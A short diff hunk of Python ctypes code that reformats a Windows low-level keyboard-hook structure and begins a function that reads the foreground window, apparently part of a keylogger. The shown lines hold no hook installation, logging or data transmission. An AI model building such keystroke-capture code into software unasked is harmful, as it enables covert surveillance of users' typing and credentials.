@@ -39,11 +39,7 @@ GetMessageA=user32.GetMessageA
 GetMessageA.argtypes=(wintypes.LPMSG,wintypes.HWND,wintypes.UINT,wintypes.UINT)
 GetMessageA.restype=wintypes.BOOL
 class KBDLLHOOKSTRUCTS(Structure):
-	_fields_=[("vkCode",wintypes.DWORD),
-				("scanCode",wintypes.DWORD),
-				("flag",wintypes.DWORD),
-				("time",wintypes.DWORD),
-				("dwExtraInfo",wintypes.DWORD)]
+	_fields_=[("vkCode",wintypes.DWORD),("scanCode",wintypes.DWORD),("flag",wintypes.DWORD),("time",wintypes.DWORD),("dwExtraInfo",wintypes.DWORD)]
 def get_foreground_process():
 	hwnd=user32.GetForegroundWindow()
 	length=GetWindowTextLengthA(hwnd)
